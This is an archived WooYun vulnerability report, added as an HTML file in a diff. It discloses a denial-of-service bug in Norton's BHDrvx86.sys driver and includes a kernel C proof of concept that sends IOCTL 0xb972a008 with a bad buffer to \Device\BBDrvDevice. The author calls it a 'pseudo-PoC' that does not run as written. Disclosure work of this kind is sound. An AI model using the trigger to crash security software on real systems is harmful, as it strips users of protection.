@@ -1,0 +1,267 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		诺顿BHDrvx86.sys拒绝服务漏洞(附伪POC)  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		诺顿BHDrvx86.sys拒绝服务漏洞(附伪POC)  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/n0bele">n0bele</a> 
+</li><li>提交时间：		2013-08-19 14:17</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-08-19：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2013-11-17：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">BHDrvx86.sys一直问题不断，才修补了上一个版本，最新版的问题又来了</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">为什么叫伪POC呢？因为真POC可能得HOOK ZwDeviceIoControlFile修改值，而那样实在费力，直接ZwOpenFile \\Device\\BBDrvDevice是成功不了的，可能做了校验.我只为说明问题，所以省事点，据说不带POC不让过的.<br />
+<br />
+<br />
+<br />
+问题出在发送IO 0xb972a008的时候，inputbuffer没处理好.当然能不能提权对这个bug而言真的毫无意义了。<br />
+<br />
+BOOLEAN <br />
+<br />
+SendInterface(<br />
+<br />
+				IN PCWSTR	DeviceName,<br />
+<br />
+				IN ULONG	IoControlCode,<br />
+<br />
+				IN PVOID	Data,<br />
+<br />
+				IN ULONG	DataLength<br />
+<br />
+				)<br />
+<br />
+{<br />
+<br />
+	NTSTATUS ntStatus = STATUS_SUCCESS;<br />
+<br />
+	PFILE_OBJECT pNetObject = NULL;<br />
+<br />
+	OBJECT_ATTRIBUTES ObPassthru;<br />
+<br />
+	IO_STATUS_BLOCK NetStatusBlock;<br />
+<br />
+	UNICODE_STRING      PassthruString;<br />
+<br />
+	HANDLE hNet =NULL;<br />
+<br />
+	BOOLEAN	bRet = FALSE;<br />
+<br />
+<br />
+<br />
+	__try<br />
+<br />
+	{<br />
+<br />
+		RtlInitUnicodeString( &amp;PassthruString, DeviceName);<br />
+<br />
+		InitializeObjectAttributes( &amp;ObPassthru,&amp;PassthruString,0,(HANDLE) NULL,(PSECURITY_DESCRIPTOR)NULL);<br />
+<br />
+<br />
+<br />
+		ntStatus = ZwOpenFile(&amp;hNet,OBJ_CASE_INSENSITIVE,&amp;ObPassthru,&amp;NetStatusBlock,0,FILE_NON_DIRECTORY_FILE);<br />
+<br />
+		if (!NT_SUCCESS(ntStatus))<br />
+<br />
+		{<br />
+<br />
+			DbgPrint(&quot;[SendInterface] ZwOpenFile  failed err=[0x%08x]\n&quot;, ntStatus);<br />
+<br />
+			__leave;<br />
+<br />
+		}<br />
+<br />
+		ntStatus = ObReferenceObjectByHandle(hNet,0,NULL,KernelMode,(PVOID *) &amp;pNetObject,NULL );<br />
+<br />
+<br />
+<br />
+		if (!NT_SUCCESS(ntStatus))<br />
+<br />
+		{<br />
+<br />
+			DbgPrint(&quot;[SendInterface] ObReferenceObjectByHandle  failed err=[0x%08x]\n&quot;, ntStatus);<br />
+<br />
+			ZwClose(hNet);<br />
+<br />
+			__leave;<br />
+<br />
+		}<br />
+<br />
+<br />
+<br />
+		ntStatus = ZwDeviceIoControlFile(hNet,NULL,NULL,NULL,&amp;NetStatusBlock,IoControlCode,Data,DataLength,NULL,0);<br />
+<br />
+		ObDereferenceObject(pNetObject);<br />
+<br />
+<br />
+<br />
+		if (!NT_SUCCESS(ntStatus))<br />
+<br />
+		{<br />
+<br />
+			DbgPrint(&quot;[SendInterface] ZwDeviceIoControlFile  failed err=[0x%08x]\n&quot;, ntStatus);<br />
+<br />
+			ZwClose(hNet);<br />
+<br />
+			__leave;<br />
+<br />
+		}<br />
+<br />
+<br />
+<br />
+		ZwClose(hNet);<br />
+<br />
+		bRet = TRUE;<br />
+<br />
+	}<br />
+<br />
+	__except(EXCEPTION_EXECUTE_HANDLER)<br />
+<br />
+	{<br />
+<br />
+		KdPrint((&quot;[SendInterface]Memory access failed.&quot;));<br />
+<br />
+	}<br />
+<br />
+<br />
+<br />
+	return bRet;<br />
+<br />
+}<br />
+<br />
+<br />
+<br />
+SendInterface(L&quot;\\Device\\BBDrvDevice&quot;,0xb972a008,(PVOID)0x02f0ade0,0x00000030); </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/18213911ea0e6b75ecac55de78e9bcfb6c68e105.jpg" target="_blank"><img src="../images/18213911ea0e6b75ecac55de78e9bcfb6c68e105.jpg" alt="sym.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">They understand~ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/n0bele" title="n0bele">n0bele</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-034678" title="诺顿BHDrvx86.sys拒绝服务漏洞(附伪POC)">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																	
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="34678";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
